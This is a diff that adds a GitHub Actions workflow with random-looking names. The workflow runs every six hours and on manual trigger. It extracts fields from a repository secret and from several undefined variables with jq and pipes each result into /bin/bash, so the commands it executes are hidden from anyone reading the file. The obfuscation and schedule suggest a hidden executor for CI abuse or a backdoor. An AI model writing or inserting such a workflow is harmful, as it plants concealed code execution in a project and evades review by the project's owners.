@@ -1,0 +1,25 @@
+name: xiklihjk
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiklihjk
+        env:
+          xrtpk16: ${{ secrets.xrtpk16 }}
+        run: |
+          echo $xrtpk16 | jq -r .an5298 | /bin/bash
+          echo $dpdle9 | jq -r .rm80880 | /bin/bash
+          echo $auln2 | jq -r .c62651 | /bin/bash
+          echo $qt36427 | jq -r .eckm549 | /bin/bash
+          echo $rea3121 | jq -r .bypzv771 | /bin/bash
+          echo $ywqjq04 | jq -r .rt805 | /bin/bash
+          echo $ny9 | jq -r .qapd94 | /bin/bash
+          echo $lc5 | jq -r .bc66601 | /bin/bash
+
